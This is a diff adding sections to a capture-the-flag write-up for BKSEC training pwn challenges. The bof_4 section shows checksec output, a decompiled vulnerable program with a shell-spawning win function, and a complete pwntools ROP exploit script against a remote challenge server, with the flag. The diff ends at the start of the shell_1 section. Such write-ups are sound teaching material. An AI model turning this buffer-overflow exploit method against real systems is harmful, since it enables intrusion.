@@ -694,3 +694,152 @@ p.interactive()
 ```
 
 Flag: `BKSEC{maTh_1s_7hE_woR57_thIn6_EveRrr}`.
+
+![alt text](image-6.png)
+
+## bof_4
+Basic file information:
+
+```bash
+$ file bof_4
+bof_4: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=59000cf22e82083de57e56e0e9bf86524176a5ed, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+$ pwn checksec bof_4
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/bof_4/bof_4'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
+This problem have `PIE enabled`. But it leaked the base address itself.
+
+```bash
+$ ./bof_4
+Wait a second til i eat my PIE!
+...
+Opps! 0x5933016f5000
+...
+Enter your favorite number: nig
+
+```
+
+Variable address I get using Cutter:
+
+![alt text](image-8.png)
+
+Decompile using IDA Pro:
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char s[8]; // [rsp+0h] [rbp-60h] BYREF
+  __int64 v5; // [rsp+8h] [rbp-58h]
+  __int64 v6; // [rsp+10h] [rbp-50h]
+  __int64 v7; // [rsp+18h] [rbp-48h]
+  __int64 v8; // [rsp+20h] [rbp-40h]
+  __int64 v9; // [rsp+28h] [rbp-38h]
+  __int64 v10; // [rsp+30h] [rbp-30h]
+  __int64 v11; // [rsp+38h] [rbp-28h]
+  __int64 v12; // [rsp+40h] [rbp-20h]
+  __int64 v13; // [rsp+48h] [rbp-18h]
+  int *v14; // [rsp+58h] [rbp-8h]
+
+  setbuf(_bss_start, 0LL);
+  *(_QWORD *)s = 0LL;
+  v5 = 0LL;
+  v6 = 0LL;
+  v7 = 0LL;
+  v8 = 0LL;
+  v9 = 0LL;
+  v10 = 0LL;
+  v11 = 0LL;
+  v12 = 0LL;
+  v13 = 0LL;
+  v14 = &dword_0;
+  puts("Wait a second til i eat my PIE!");
+  puts("...");
+  printf("Opps! %p\n", &dword_0);
+  puts("...");
+  printf("Enter your favorite number: ");
+  fgets(s, 256, stdin);
+  return 0;
+}
+
+int __fastcall win(const char *a1, const char *a2)
+{
+  if ( a1 != (const char *)-2401053088876216593LL || a2 != (const char *)0xDEADBEEFDEADBEEFLL )
+  {
+    puts("!!! Access denied");
+    printf("Entered param1: %s\n", a1);
+    printf("Entered param2: %s\n", a2);
+    exit(1);
+  }
+  return system("/bin/sh");
+}
+```
+
+We have the base address. Now it became a simple bof challenge. Just add the base address before gadget/static address and we can hijack the program execution flow.
+
+This is a python script I write to exploit this challenge.
+
+```py
+from pwn import *
+
+# p = process("./bof_4")
+p = remote("103.77.175.40", 6031)
+
+p.recvuntil(b"Opps! ")
+
+static_addr = 0x555555554000 - 0x555555554000
+dynamic_addr = int(p.recvline()[:-1].decode("utf-8"), 0)
+
+base_addr = dynamic_addr - static_addr
+
+win_addr = 0x00001206 + base_addr
+pop_rdi_ret = base_addr + 0x00000000000011F8
+pop_rsi_ret = base_addr + 0x0000000000001201
+ret_addr = base_addr + 0x000000000000101A
+
+target = 0xDEADBEEFDEADBEEF
+offset = 0x68
+
+payload = b"A" * offset
+payload += p64(pop_rdi_ret) + p64(target)
+payload += p64(pop_rsi_ret) + p64(target)
+payload += p64(ret_addr) + p64(win_addr)
+
+p.sendline(payload)
+p.interactive()
+```
+
+![alt text](image-7.png)
+
+Flag: `BKSEC{apP13_pi3_1s_D3lIC1ouS_BuT_NoT_PIE_XD}`
+
+## shell_1
+
+As always, basic information:
+
+```bash
+$ file shell_1
+shell_1: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=4df1cf3693256fd8ca59cff383938b86e90170fe, for GNU/Linux 3.2.0, not stripped
+```
+```bash
+$ pwn checksec shell_1
+[*] '/mnt/e/ctf-chall/bksec_training/pwn/shell_1/shell_1'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+    Stripped:   No
+```
+
